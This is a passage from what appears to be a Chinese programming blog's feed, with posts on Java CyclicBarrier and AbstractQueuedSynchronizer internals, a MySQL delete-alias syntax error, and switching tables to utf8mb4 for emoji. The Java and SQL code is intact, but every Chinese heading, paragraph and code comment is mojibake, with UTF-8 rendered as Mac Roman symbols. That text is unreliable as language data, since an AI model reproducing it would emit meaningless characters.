new ConcurrentHashMap&lt;String,Integer&gt;();    private void count(){        try {            for (int i = 0; i &lt; 4; i++) {                executor.execute(new Runnable() {                    @Override                    public void run() {                        //ËÆ°ÁÆóÂΩìÂâçiÂØπÂ∫îÁöÑsheetÁöÑÈì∂ÊµÅÊï∞ÊçÆÔºåËÆ°ÁÆó‰ª£Á†ÅÁúÅÁï•                        try {                            TimeUnit.SECONDS.sleep(1);                        } catch (InterruptedException e) {                            e.printStackTrace();                        }                        sheetBankWaterCount.put(Thread.currentThread().getName(), 1);                        //Èì∂ÊµÅËÆ°ÁÆóÂÆåÊàêÔºåÊèíÂÖ•‰∏Ä‰∏™Â±èÈöú                        try {                            cyclicBarrier.await();                        } catch (InterruptedException e) {                            e.printStackTrace();                        } catch (BrokenBarrierException e) {                            e.printStackTrace();                        }                    }                });            }        }finally {            executor.shutdown();        }    }    @Override    public void run(){        int result = 0;        for(Map.Entry&lt;String,Integer&gt; sheet : sheetBankWaterCount.entrySet()){            result += sheet.getValue();        }        System.out.println(result);    }    public static void main(String[] args) {        BankWaterService bankWaterService = new BankWaterService();        bankWaterService.count();    }}</code></pre><p>‰∏äËø∞‰ª£Á†ÅÔºåÊòØ‰∏∫‰∫ÜÊâßË°åËÆ°ÁÆóÂ§ö‰∏™sheet‰∏≠ÁöÑÊï∞ÊçÆÔºåÊúÄÂêéÊâßË°åÂêàËÆ°</p><h4 id="Êù•ÊµãËØïrunnableÂà∞Â∫ïÊòØÊúÄÂÖàÊâßË°åËøòÊòØÊúÄÂêéÊâßË°å"><a href="#Êù•ÊµãËØïrunnableÂà∞Â∫ïÊòØÊúÄÂÖàÊâßË°åËøòÊòØÊúÄÂêéÊâßË°å" class="headerlink" title="Êù•ÊµãËØïrunnableÂà∞Â∫ïÊòØÊúÄÂÖàÊâßË°åËøòÊòØÊúÄÂêéÊâßË°å"></a>Êù•ÊµãËØïrunnableÂà∞Â∫ïÊòØÊúÄÂÖàÊâßË°åËøòÊòØÊúÄÂêéÊâßË°å</h4><pre><code>public class CyclicBarrierTest2 {    static CyclicBarrier cyclicBarrier = new CyclicBarrier(2,new A());    public static void main(String[] args) {        new Thread(new Runnable() {            @Override            public void run() {                try {                    cyclicBarrier.await();                } catch (InterruptedException e) {                    e.printStackTrace();                } catch (BrokenBarrierException e) {                    e.printStackTrace();                }                System.out.println(1);            }        }).start();        try {            cyclicBarrier.await();        } catch (InterruptedException e) {            e.printStackTrace();        } catch (BrokenBarrierException e) {            e.printStackTrace();        }        System.out.println(2);    }    static class A implements Runnable{        @Override        public void run() {            System.out.println(3);        }    }}//ËæìÂá∫ÁªìÊûú31 2</code></pre><h4 id="Ê∫êÁ†ÅÂàÜÊûê"><a href="#Ê∫êÁ†ÅÂàÜÊûê" class="headerlink" title="Ê∫êÁ†ÅÂàÜÊûê"></a>Ê∫êÁ†ÅÂàÜÊûê</h4><p>Ë¶ÅÁü•ÈÅìÊ∫êÁ†Å‰∏≠Ë∞ÉÁî®ÁöÑÊòØReentrantLockÂèØÈáçÂÖ•ÂºèÈîÅ</p><pre><code>/**    * Main barrier code, covering the various policies.    */   private int dowait(boolean timed, long nanos)       throws InterruptedException, BrokenBarrierException,              TimeoutException {       final ReentrantLock lock = this.lock;       lock.lock();       try {           final Generation g = generation;           if (g.broken)               throw new BrokenBarrierException();           if (Thread.interrupted()) {               breakBarrier();               throw new InterruptedException();           }           int index = --count;           //ÂèØ‰ª•ÁúãÂà∞ÔºåÊâßË°å‰∫ÜÂ§ö‰∏™await()‰πãÂêéÔºåÂØºËá¥count==0Êó∂ÔºåÊâç‰ºöÊâßË°å‰∏ãÈù¢‰ª£Á†Å           if (index == 0) {  // tripped               boolean ranAction = false;               try {                   final Runnable command = barrierCommand;                   if (command != null)                       //Ëøô‰∏™Âú∞ÊñπÊúÄÊêûÁ¨ëÁöÑÊòØ‰ªñÁõ¥Êé•run‰∫Ü„ÄÇ                       command.run();                   ranAction = true;                   //Ê≠§Â§ÑÊòØ‰∏∫‰∏ã‰∏ÄÊ≥¢ÂÉµÂ∞∏Êù•‰∏¥ÂÅöÂáÜÂ§á                   nextGeneration();                   return 0;               } finally {                   if (!ranAction)                       breakBarrier();               }           }           // loop until tripped, broken, interrupted, or timed out           for (;;) {               try {                   if (!timed)                       trip.await();                   else if (nanos &gt; 0L)                       nanos = trip.awaitNanos(nanos);               } catch (InterruptedException ie) {                   if (g == generation &amp;&amp; ! g.broken) {                       breakBarrier();                       throw ie;                   } else {                       // We&apos;re about to finish waiting even if we had not                       // been interrupted, so this interrupt is deemed to                       // &quot;belong&quot; to subsequent execution.                       Thread.currentThread().interrupt();                   }               }               if (g.broken)                   throw new BrokenBarrierException();               if (g != generation)                   return index;               if (timed &amp;&amp; nanos &lt;= 0L) {                   breakBarrier();                   throw new TimeoutException();               }           }       } finally {           lock.unlock();       }   }       /**    * Updates state on barrier trip and wakes up everyone.    * Called only while holding lock.    */   private void nextGeneration() {       // signal completion of last generation       trip.signalAll();       // set up next generation       //ÈáçÊñ∞ÁªôcountËµã‰∫ÜÂÄºÔºåparties‰πüÂ∞±ÊòØÊûÑÈÄ†ÂáΩÊï∞ÈáåÈù¢ÁöÑÂÄº       count = parties;       generation = new Generation();   }</code></pre><h4 id="await-Ëøô‰∏™ËÄÉËôëÊõ¥Â§öÁöÑÊòØÔºå‰Ω†ÁöÑÁ∫øÁ®ã‰∏öÂä°ÊâßË°åÂÆåÂêéÔºåÂÜçË∞ÉÁî®await-ÊâçÂ•ΩÊâßË°å„ÄÇÁõ¥Âà∞ÊâßË°åÂà∞ÊúÄÂêé‰∏Ä‰∏™ÔºåÊâç‰ºöÊ≠£Âú®ÁöÑunlock"><a href="#await-Ëøô‰∏™ËÄÉËôëÊõ¥Â§öÁöÑÊòØÔºå‰Ω†ÁöÑÁ∫øÁ®ã‰∏öÂä°ÊâßË°åÂÆåÂêéÔºåÂÜçË∞ÉÁî®await-ÊâçÂ•ΩÊâßË°å„ÄÇÁõ¥Âà∞ÊâßË°åÂà∞ÊúÄÂêé‰∏Ä‰∏™ÔºåÊâç‰ºöÊ≠£Âú®ÁöÑunlock" class="headerlink" title="await()Ëøô‰∏™ËÄÉËôëÊõ¥Â§öÁöÑÊòØÔºå‰Ω†ÁöÑÁ∫øÁ®ã‰∏öÂä°ÊâßË°åÂÆåÂêéÔºåÂÜçË∞ÉÁî®await()ÊâçÂ•ΩÊâßË°å„ÄÇÁõ¥Âà∞ÊâßË°åÂà∞ÊúÄÂêé‰∏Ä‰∏™ÔºåÊâç‰ºöÊ≠£Âú®ÁöÑunlock();"></a>await()Ëøô‰∏™ËÄÉËôëÊõ¥Â§öÁöÑÊòØÔºå‰Ω†ÁöÑÁ∫øÁ®ã‰∏öÂä°ÊâßË°åÂÆåÂêéÔºåÂÜçË∞ÉÁî®await()ÊâçÂ•ΩÊâßË°å„ÄÇÁõ¥Âà∞ÊâßË°åÂà∞ÊúÄÂêé‰∏Ä‰∏™ÔºåÊâç‰ºöÊ≠£Âú®ÁöÑunlock();</h4><h4 id="Â±ïÁ§∫‰∏ÄÊ≥¢ÔºåcyclicBarrierÈáçÁî®"><a href="#Â±ïÁ§∫‰∏ÄÊ≥¢ÔºåcyclicBarrierÈáçÁî®" class="headerlink" title="Â±ïÁ§∫‰∏ÄÊ≥¢ÔºåcyclicBarrierÈáçÁî®"></a>Â±ïÁ§∫‰∏ÄÊ≥¢ÔºåcyclicBarrierÈáçÁî®</h4><pre><code>public class CyclicBarrierTest3 {    static class Writer extends Thread{        private CyclicBarrier cyclicBarrier;        public Writer(CyclicBarrier cyclicBarrier){            this.cyclicBarrier = cyclicBarrier;        }        @Override        public void run() {            System.out.println(&quot;Á∫øÁ®ã&quot; + Thread.currentThread().getName() + &quot;Ê≠£Âú®ÂÜôÂÖ•Êï∞ÊçÆ...&quot;);            try {                Thread.sleep(5000);                System.out.println(&quot;Á∫øÁ®ã&quot; + Thread.currentThread().getName() + &quot;ÂÜôÂÖ•Êï∞ÊçÆÂÆåÊØïÔºåÁ≠âÂæÖÂÖ∂‰ªñÁ∫øÁ®ãÂÜôÂÖ•&quot;);                cyclicBarrier.await();            } catch (InterruptedException e) {                e.printStackTrace();            }catch (BrokenBarrierException e){                e.printStackTrace();            }            System.out.println(Thread.currentThread().getName() + &quot;ÊâÄÊúâÁ∫øÁ®ãÂÜôÂÖ•ÂÆåÊØïÔºåÁªßÁª≠Â§ÑÁêÜÂÖ∂‰ªñ‰ªªÂä°&quot;);        }    }    public static void main(String[] args) {        int N = 4;        CyclicBarrier cyclicBarrier = new CyclicBarrier(N);        for(int i = 0 ;i &lt; N ;i++){            new Writer(cyclicBarrier).start();        }        try {            Thread.sleep(25000);        } catch (InterruptedException e) {            e.printStackTrace();        }        System.out.println(&quot;CyclicbarrierÈáçÁî®&quot;);        for(int i = 0 ;i &lt; N ;i++){            new Writer(cyclicBarrier).start();        }    }}//ËæìÂá∫ÁªìÊûúÁ∫øÁ®ãThread-0Ê≠£Âú®ÂÜôÂÖ•Êï∞ÊçÆ...Á∫øÁ®ãThread-2Ê≠£Âú®ÂÜôÂÖ•Êï∞ÊçÆ...Á∫øÁ®ãThread-1Ê≠£Âú®ÂÜôÂÖ•Êï∞ÊçÆ...Á∫øÁ®ãThread-3Ê≠£Âú®ÂÜôÂÖ•Êï∞ÊçÆ...Á∫øÁ®ãThread-2ÂÜôÂÖ•Êï∞ÊçÆÂÆåÊØïÔºåÁ≠âÂæÖÂÖ∂‰ªñÁ∫øÁ®ãÂÜôÂÖ•Á∫øÁ®ãThread-0ÂÜôÂÖ•Êï∞ÊçÆÂÆåÊØïÔºåÁ≠âÂæÖÂÖ∂‰ªñÁ∫øÁ®ãÂÜôÂÖ•Á∫øÁ®ãThread-1ÂÜôÂÖ•Êï∞ÊçÆÂÆåÊØïÔºåÁ≠âÂæÖÂÖ∂‰ªñÁ∫øÁ®ãÂÜôÂÖ•Á∫øÁ®ãThread-3ÂÜôÂÖ•Êï∞ÊçÆÂÆåÊØïÔºåÁ≠âÂæÖÂÖ∂‰ªñÁ∫øÁ®ãÂÜôÂÖ•Thread-2ÊâÄÊúâÁ∫øÁ®ãÂÜôÂÖ•ÂÆåÊØïÔºåÁªßÁª≠Â§ÑÁêÜÂÖ∂‰ªñ‰ªªÂä°Thread-1ÊâÄÊúâÁ∫øÁ®ãÂÜôÂÖ•ÂÆåÊØïÔºåÁªßÁª≠Â§ÑÁêÜÂÖ∂‰ªñ‰ªªÂä°Thread-3ÊâÄÊúâÁ∫øÁ®ãÂÜôÂÖ•ÂÆåÊØïÔºåÁªßÁª≠Â§ÑÁêÜÂÖ∂‰ªñ‰ªªÂä°Thread-0ÊâÄÊúâÁ∫øÁ®ãÂÜôÂÖ•ÂÆåÊØïÔºåÁªßÁª≠Â§ÑÁêÜÂÖ∂‰ªñ‰ªªÂä°CyclicbarrierÈáçÁî®Á∫øÁ®ãThread-4Ê≠£Âú®ÂÜôÂÖ•Êï∞ÊçÆ...Á∫øÁ®ãThread-5Ê≠£Âú®ÂÜôÂÖ•Êï∞ÊçÆ...Á∫øÁ®ãThread-6Ê≠£Âú®ÂÜôÂÖ•Êï∞ÊçÆ...Á∫øÁ®ãThread-7Ê≠£Âú®ÂÜôÂÖ•Êï∞ÊçÆ...Á∫øÁ®ãThread-4ÂÜôÂÖ•Êï∞ÊçÆÂÆåÊØïÔºåÁ≠âÂæÖÂÖ∂‰ªñÁ∫øÁ®ãÂÜôÂÖ•Á∫øÁ®ãThread-6ÂÜôÂÖ•Êï∞ÊçÆÂÆåÊØïÔºåÁ≠âÂæÖÂÖ∂‰ªñÁ∫øÁ®ãÂÜôÂÖ•Á∫øÁ®ãThread-7ÂÜôÂÖ•Êï∞ÊçÆÂÆåÊØïÔºåÁ≠âÂæÖÂÖ∂‰ªñÁ∫øÁ®ãÂÜôÂÖ•Á∫øÁ®ãThread-5ÂÜôÂÖ•Êï∞ÊçÆÂÆåÊØïÔºåÁ≠âÂæÖÂÖ∂‰ªñÁ∫øÁ®ãÂÜôÂÖ•Thread-5ÊâÄÊúâÁ∫øÁ®ãÂÜôÂÖ•ÂÆåÊØïÔºåÁªßÁª≠Â§ÑÁêÜÂÖ∂‰ªñ‰ªªÂä°Thread-4ÊâÄÊúâÁ∫øÁ®ãÂÜôÂÖ•ÂÆåÊØïÔºåÁªßÁª≠Â§ÑÁêÜÂÖ∂‰ªñ‰ªªÂä°Thread-6ÊâÄÊúâÁ∫øÁ®ãÂÜôÂÖ•ÂÆåÊØïÔºåÁªßÁª≠Â§ÑÁêÜÂÖ∂‰ªñ‰ªªÂä°Thread-7ÊâÄÊúâÁ∫øÁ®ãÂÜôÂÖ•ÂÆåÊØïÔºåÁªßÁª≠Â§ÑÁêÜÂÖ∂‰ªñ‰ªªÂä°</code></pre><blockquote><p><a href="https://www.cnblogs.com/dolphin0520/p/3920397.html" target="_blank" rel="noopener"> ÈÉ®ÂàÜÁ§∫‰æãÊù•Ëá™Êµ∑Â≠êÁöÑÂçöÂÆ¢ </a></p></blockquote><blockquote><p>ËøòÊúâÈÉ®ÂàÜ‰ª£Á†ÅÊù•Ëá™Ôºö„ÄäjavaÂπ∂ÂèëÁºñÁ®ãÁöÑËâ∫ÊúØ„Äã</p></blockquote><h3 id="‰∏çÁü•‰πãÂ§ÑÔºåÊ¨¢ËøéÂ§ßÂÆ∂ÁïôË®Ä"><a href="#‰∏çÁü•‰πãÂ§ÑÔºåÊ¨¢ËøéÂ§ßÂÆ∂ÁïôË®Ä" class="headerlink" title="‰∏çÁü•‰πãÂ§ÑÔºåÊ¨¢ËøéÂ§ßÂÆ∂ÁïôË®Ä"></a>‰∏çÁü•‰πãÂ§ÑÔºåÊ¨¢ËøéÂ§ßÂÆ∂ÁïôË®Ä</h3>]]></content>
      
      
      
        <tags>
            
            <tag> JavaÂπ∂Âèë </tag>
            
            <tag> Âπ∂Âèë </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mysql‰∏≠deleteÂà´ÂêçÈóÆÈ¢ò</title>
      <link href="/2019/10/14/mysql%E4%B8%ADdelete%E5%88%AB%E5%90%8D%E9%97%AE%E9%A2%98/"/>
      <url>/2019/10/14/mysql%E4%B8%ADdelete%E5%88%AB%E5%90%8D%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<pre><code>delete from table_name t where t.column = 1# You have an error in your SQL syntax;# check the manual that corresponds to your MySQL server version # for the right syntax to use near &apos;t where t.column = 1&apos; at line 1</code></pre><h3 id="Âá∫Áé∞‰∫ÜËØ≠Ê≥ïÈîôËØØ"><a href="#Âá∫Áé∞‰∫ÜËØ≠Ê≥ïÈîôËØØ" class="headerlink" title="Âá∫Áé∞‰∫ÜËØ≠Ê≥ïÈîôËØØ"></a>Âá∫Áé∞‰∫ÜËØ≠Ê≥ïÈîôËØØ</h3><h4 id="Ê≠£Á°ÆÂÜôÊ≥ï"><a href="#Ê≠£Á°ÆÂÜôÊ≥ï" class="headerlink" title="Ê≠£Á°ÆÂÜôÊ≥ï"></a>Ê≠£Á°ÆÂÜôÊ≥ï</h4><pre><code>delete &lt;alias&gt; from &lt;table&gt; &lt;alias&gt; where &lt;alias&gt;.&lt;field&gt;...</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> mysql </tag>
            
            <tag> delete </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ÂæÆ‰ø°ÊòµÁß∞‰∏≠Ë°®ÊÉÖ‰øùÂ≠òÂà∞Êï∞ÊçÆÂ∫ìÈóÆÈ¢ò</title>
      <link href="/2019/09/30/%E5%BE%AE%E4%BF%A1%E6%98%B5%E7%A7%B0%E4%B8%AD%E8%A1%A8%E6%83%85%E4%BF%9D%E5%AD%98%E5%88%B0%E6%95%B0%E6%8D%AE%E5%BA%93%E9%97%AE%E9%A2%98/"/>
      <url>/2019/09/30/%E5%BE%AE%E4%BF%A1%E6%98%B5%E7%A7%B0%E4%B8%AD%E8%A1%A8%E6%83%85%E4%BF%9D%E5%AD%98%E5%88%B0%E6%95%B0%E6%8D%AE%E5%BA%93%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h3 id="ÂæÆ‰ø°ÊòµÁß∞‰∏≠ÂåÖÂê´Ë°®ÊÉÖÂØºËá¥Êó†Ê≥ïÊèíÂÖ•Êï∞ÊçÆÂ∫ì"><a href="#ÂæÆ‰ø°ÊòµÁß∞‰∏≠ÂåÖÂê´Ë°®ÊÉÖÂØºËá¥Êó†Ê≥ïÊèíÂÖ•Êï∞ÊçÆÂ∫ì" class="headerlink" title="ÂæÆ‰ø°ÊòµÁß∞‰∏≠ÂåÖÂê´Ë°®ÊÉÖÂØºËá¥Êó†Ê≥ïÊèíÂÖ•Êï∞ÊçÆÂ∫ì"></a>ÂæÆ‰ø°ÊòµÁß∞‰∏≠ÂåÖÂê´Ë°®ÊÉÖÂØºËá¥Êó†Ê≥ïÊèíÂÖ•Êï∞ÊçÆÂ∫ì</h3><pre><code>java.sql.SQLException: Incorrect string value: &apos;\xF0\x9F\x8E\x80&apos; for column &apos;wechat_nick_name&apos;</code></pre><h3 id="Ê≥®ÊÑè"><a href="#Ê≥®ÊÑè" class="headerlink" title="Ê≥®ÊÑè"></a>Ê≥®ÊÑè</h3><p>‰øÆÊîπÂæÆ‰ø°ÊòµÁß∞Âêé,Ëé∑ÂèñÂæÆ‰ø°ÊòµÁß∞ÂíåÂ§¥ÂÉèÊòØÊúâÁºìÂ≠òÁöÑ,ÊàëËøôÊ¨°ÊòØ1‰∏™Â∞èÊó∂,ÁºìÂ≠òÂ∞±Âà∑Êñ∞‰∫Ü</p><h3 id="Ëß£ÂÜ≥Ê≠•È™§"><a href="#Ëß£ÂÜ≥Ê≠•È™§" class="headerlink" title="Ëß£ÂÜ≥Ê≠•È™§"></a>Ëß£ÂÜ≥Ê≠•È™§</h3><ul><li>‰øÆÊîπÂØπÂ∫îË°®‰∏≠ÁöÑÁºñÁ†Å </li></ul><pre><code>ALTER TABLE table_name CONVERT TO CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci;</code></pre><ul><li>‰øÆÊîπÂØπÂ∫îÂ≠óÊÆµ‰∏≠ÁöÑÁºñÁ†Å </li></ul><pre><code>ALTER TABLE table_name CHANGE column_name VARCHAR(191) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci;</code></pre><ul><li>‰øÆÊîπËøûÊé•Ê±†‰∏≠ÈÖçÁΩÆ(Êàë‰ΩøÁî®ÁöÑÊòØdruid) </li></ul><pre><code>spring: datasource:   druid:     connection-init-sqls: set names utf8mb4</code></pre><ul><li>‰øÆÊîπÊï∞ÊçÆÂ∫ìËøûÊé•url </li></ul><pre><code>datasource: type: com.alibaba.druid.pool.DruidDataSource driver-class-name: com.mysql.cj.jdbc.Driver url: jdbc:mysql://127.0.0.1:3306/databaseName?useUnicode=true&amp;characterEncoding=UTF-8&amp;serverTimezone=Asia/Shanghai&amp;autoReconnect=true</code></pre><p>ÂÖ∂‰∏≠ <code>autoReconnect=true</code></p><h3 id="ÊÄªÁªì-Êé®ËçêÊï∞ÊçÆÂ∫ìËÆæËÆ°Êó∂-‰ΩøÁî®-utf8mb4"><a href="#ÊÄªÁªì-Êé®ËçêÊï∞ÊçÆÂ∫ìËÆæËÆ°Êó∂-‰ΩøÁî®-utf8mb4" class="headerlink" title="ÊÄªÁªì,Êé®ËçêÊï∞ÊçÆÂ∫ìËÆæËÆ°Êó∂,‰ΩøÁî® utf8mb4"></a>ÊÄªÁªì,Êé®ËçêÊï∞ÊçÆÂ∫ìËÆæËÆ°Êó∂,‰ΩøÁî® <code>utf8mb4</code></h3>]]></content>
      
      
      
        <tags>
            
            <tag> JavaÂ≠¶‰π† </tag>
            
            <tag> ÂæÆ‰ø°ÊòµÁß∞ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ÈòüÂàóÂêåÊ≠•Âô®-AbstractQueuedSynchronizer</title>
      <link href="/2019/09/26/%E9%98%9F%E5%88%97%E5%90%8C%E6%AD%A5%E5%99%A8-AbstractQueuedSynchronizer/"/>
      <url>/2019/09/26/%E9%98%9F%E5%88%97%E5%90%8C%E6%AD%A5%E5%99%A8-AbstractQueuedSynchronizer/</url>
      
        <content type="html"><![CDATA[<h4 id="Ê®°ÊùøÊñπÊ≥ï"><a href="#Ê®°ÊùøÊñπÊ≥ï" class="headerlink" title="Ê®°ÊùøÊñπÊ≥ï"></a>Ê®°ÊùøÊñπÊ≥ï</h4><p>Ëøô‰∏™ÈòüÂàóÂêåÊ≠•Âô®ÁöÑËÆæËÆ°Â∞±ÊòØÂü∫‰∫éÊ®°ÊùøÊñπÊ≥ï</p><blockquote><p>Ê®°ÊùøËÆæËÆ°Ê®°ÂºèÁöÑÂÆö‰πâÔºöÂÆö‰πâ‰∏Ä‰∏™Êìç‰Ωú‰∏≠ÁöÑÁÆóÊ≥ïÁöÑÊ°ÜÊû∂ÔºåËÄåÂ∞Ü‰∏Ä‰∫õÊ≠•È™§Âª∂ËøüÂà∞Â≠êÁ±ª‰∏≠Ôºå‰ΩøÂæóÂ≠êÁ±ªÂèØ‰ª•‰∏çÊîπÂèò‰∏Ä‰∏™ÁÆóÊ≥ïÁöÑÁªìÊûÑÂç≥ÂèØÈáçÂÆö‰πâËØ•ÁÆóÊ≥ïÁöÑÊüê‰∫õÁâπÂÆöÊ≠•È™§„ÄÇ</p></blockquote><h4 id="Â§ßËá¥‰ªãÁªç"><a href="#Â§ßËá¥‰ªãÁªç" class="headerlink" title="Â§ßËá¥‰ªãÁªç"></a>Â§ßËá¥‰ªãÁªç</h4><p>ÂêåÊ≠•Âô®‰æùËµñÂÜÖÈÉ®ÁöÑÂêåÊ≠•ÈòüÂàó(‰∏Ä‰∏™FIFOÂèåÂêëÈòüÂàó),Êù•ÂÆåÊàêÂêåÊ≠•Áä∂ÊÄÅÁöÑÁÆ°ÁêÜ,ÂΩìÂâçÁ∫øÁ®ãËé∑ÂèñÂêåÊ≠•Áä∂ÊÄÅÂ§±Ë¥•Êó∂,ÂêåÊ≠•Âô®‰ºöÂ∞ÜÂΩìÂâçÁ∫øÁ®ã‰ª•ÂèäÁ≠âÂæÖ‰ø°ÊÅØÊîæÂÖ•Âà∞‰∏Ä‰∏™ËäÇÁÇπNodeÂπ∂Â∞ÜÂÖ∂Âä†ÂÖ•ÂêåÊ≠•ÈòüÂàó,ÂêåÊó∂‰ºöÈòªÂ°ûÂΩìÂâçÁ∫øÁ®ã,‰ΩÜÂêåÊ≠•Áä∂ÊÄÅÈáäÊîæÊó∂,‰ºöÂ∞ÜÈ¶ñËäÇÁÇπÁöÑÁ∫øÁ®ãÂî§ÈÜí,‰ΩøÂÖ∂‰∫ßÁîüËé∑ÂèñÂêåÊ≠•Áä∂ÊÄÅ.</p><p>ÂêåÊ≠•ÈòüÂàóÁöÑËäÇÁÇπ(Node)Áî®Êù• <em>‰øùÂ≠òËé∑ÂèñÂêåÊ≠•Áä∂ÊÄÅÂ§±Ë¥•ÁöÑÁ∫øÁ®ãÂºïÁî®</em> ,Á≠âÂæÖÁä∂ÊÄÅ‰ª•ÂèäÂâçÈ©±ÂíåÂêéÈ©±ËäÇÁÇπ,ÁªìÁÇπÁöÑÂ±ûÊÄßÁ±ªÂûã‰∏éÂêçÁß∞‰ª•ÂèäÊèèËø∞.</p><pre><code>static final class Node {    //Á≠âÂæÖÁä∂ÊÄÅ    volatile int waitStatus;    //ÂâçÈ©±    volatile Node prev;    //ÂêéÈ©±    volatile Node next;    //Ëé∑ÂèñÂêåÊ≠•Áä∂ÊÄÅÂ§±Ë¥•ÁöÑÁ∫øÁ®ãÂºïÁî®    volatile Thread thread;    Node nextWaiter;}</code></pre><p>ËäÇÁÇπÊòØÊûÑÊàêÂêåÊ≠•ÈòüÂàóÁöÑÂü∫Á°Ä,ÂêåÊ≠•Âô®Êã•ÊúâÈ¶ñËäÇÁÇπÂíåÂ∞æÁªìÁÇπ,Ê≤°ÊúâÊàêÂäüËé∑ÂèñÂêåÊ≠•Áä∂ÊÄÅÁöÑÁ∫øÁ®ãÂ∞Ü‰ºöÂä†ÂÖ•ËØ•ÈòüÂàóÁöÑÂ∞æÈÉ®.</p><p>ËØïÊÉ≥‰∏Ä‰∏ã,‰∏Ä‰∏™Á∫øÁ®ãËé∑ÂèñÂêåÊ≠•Áä∂ÊÄÅÊàêÂäü,ÂÖ∂‰ªñÁ∫øÁ®ãÊó†Ê≥ïËé∑ÂèñÂêåÊ≠•Áä∂ÊÄÅ,ËΩ¨ËÄåÂéªÊûÑÈÄ†ÁªìÁÇπÂπ∂Âä†ÂÖ•ÂêåÊ≠•ÈòüÂàó,ËÄåÂä†ÂÖ•ÈòüÂàóÂøÖÈ°ªÊòØÁ∫øÁ®ãÂÆâÂÖ®ÁöÑ(Âõ†‰∏∫Ëøô‰∏™ÂèØËÉΩÊòØÁ´û‰∫âÁöÑ,ÂæàÂ§öÁ∫øÁ®ãÊ≤°Ëé∑ÂèñÂà∞,ÁÑ∂ÂêéÁ´û‰∫âÂä†ÂÖ•ÈòüÂàó).ÂêåÊ≠•Âô®Êèê‰æõ‰∫ÜÂü∫‰∫éCASÁöÑËÆæÁΩÆÂ∞æÁªìÁÇπÁöÑÊñπÊ≥ï:<br><code>compareAndSetTail(Node except,Node Update)</code></p><pre><code>@Override        protected boolean tryAcquire(int arg) {            if(compareAndSetState(0,1)){                setExclusiveOwnerThread(Thread.currentThread());                return true;            }            return false;        }</code></pre><p>‰∏äÈù¢Ëøô‰∏™ÊòØÊüê‰∏™ÈáçÂÜô <code>tryAcquire(int arg)</code> ÊñπÊ≥ïÁöÑ.</p><p>ÂêåÊ≠•ÈòüÂàóÈÅµÂæ™FIFO.</p><h4 id="Áã¨Âç†Âºè"><a href="#Áã¨Âç†Âºè" class="headerlink" title="Áã¨Âç†Âºè"></a>Áã¨Âç†Âºè</h4><h5 id="Ëé∑ÂèñÂêåÊ≠•Áä∂ÊÄÅ"><a href="#Ëé∑ÂèñÂêåÊ≠•Áä∂ÊÄÅ" class="headerlink" title="Ëé∑ÂèñÂêåÊ≠•Áä∂ÊÄÅ"></a>Ëé∑ÂèñÂêåÊ≠•Áä∂ÊÄÅ</h5><p>ÈÄöËøáË∞ÉÁî®ÂêåÊ≠•Âô®ÁöÑacquire(int<br>arg)ÊñπÊ≥ïÂèØ‰ª•Ëé∑ÂèñÂêåÊ≠•Áä∂ÊÄÅ,ËØ•ÊñπÊ≥ïÂØπ‰∏≠Êñ≠‰∏çÊïèÊÑü,‰πüÂ∞±ÊòØÁî±‰∫éÁ∫øÁ®ãËé∑ÂèñÂêåÊ≠•Áä∂ÊÄÅÂ§±Ë¥•ÂêéËøõÂÖ•ÂêåÊ≠•ÈòüÂàó,ÂêéÁª≠ÂØπÁ∫øÁ®ãËøõË°å‰∏≠Êñ≠Êìç‰ΩúÊó∂,Á∫øÁ®ã‰∏ç‰ºö‰ªéÂêåÊ≠•ÈòüÂàó‰∏≠ÁßªÈô§</p><pre><code>  public final void acquire(int arg) {        if (!tryAcquire(arg) &amp;&amp;            acquireQueued(addWaiter(Node.EXCLUSIVE), arg))            selfInterrupt();    }//ËØ•ÊñπÊ≥ïÂ∞±ÊòØÂàõÂª∫‰∏Ä‰∏™ËäÇÁÇπ,ÁÑ∂ÂêéËØïÂõæÂéªÂàõÂª∫‰∏Ä‰∏™ÂèåÂêëÈìæË°®ÁöÑÂ∞æÁªìÁÇπprivate Node addWaiter(Node mode) {        Node node = new Node(Thread.currentThread(), mode);        // Try the fast path of enq; backup to full enq on failure        //Ê≠§Â§ÑÂèØ‰ª•ÁúãÂà∞,ÂÆÉÂú®ÂàõÂª∫ÊàêÂäüÂêé‰ºöÁ´ãÂàªÂ∞ùËØïÂéªÂä†ÂÖ•Â∞æÁªìÁÇπ,Â¶ÇÊûúÂ§±Ë¥•Â∞±‰ºöËøõÂÖ•‰∏ãÈù¢ÁöÑenqÁöÑforÂæ™ÁéØÈáåÈù¢        Node pred = tail;        if (pred != null) {            node.prev = pred;            if (compareAndSetTail(pred, node)) {                pred.next = node;                return node;            }        }        enq(node);        return node;    }private Node enq(final Node node) {        for (;;) {            Node t = tail;            if (t == null) { // Must initialize                //Â¶ÇÊûúÈ¶ñËäÇÁÇπ‰∏çÂ≠òÂú®,Â∞±ÂàõÂª∫ÂÆÉ,                if (compareAndSetHead(new Node()))                    tail = head;            } else {                //Ê≠§Â§ÑÂ∞±ÊòØforÂæ™ÁéØÊèíÂÖ•‰∏∫ËäÇÁÇπ,CASÂºèÂøÖÂ∞ÜÂπ∂ËÆæÁΩÆ                node.prev = t;                if (compareAndSetTail(t, node)) {                    t.next = node;                    return t;                }            }        }    }/**     * Convenience method to interrupt current thread.     ÈòªÂ°ûÂΩìÂâçÁ∫øÁ®ã     */    static void selfInterrupt() {        Thread.currentThread().interrupt();    } final boolean acquireQueued(final Node node, int arg) {        boolean failed = true;        try {            boolean interrupted = false;            for (;;) {                //ÂΩìÂâçÁªìÁÇπÁöÑÂâçÈ©±ÁªìÁÇπp,                final Node p = node.predecessor();                //Â¶ÇÊûúpÊòØÂ§¥ÁªìÁÇπ,Âπ∂‰∏îÂ∞ùËØïËé∑Âèñ                if (p == head &amp;&amp; tryAcquire(arg)) {                    //Ëé∑ÂèñÊàêÂäü,Â∞ÜËØ•ÁªìÁÇπËÆæÁΩÆ‰∏∫Â§¥ÁªìÁÇπ                    setHead(node);                    p.next = null; // help GC                    failed = false;                    return interrupted;                }                if (shouldParkAfterFailedAcquire(p, node) &amp;&amp;                    parkAndCheckInterrupt())                    interrupted = true;            }        } finally {            if (failed)                cancelAcquire(node);        }    }private void 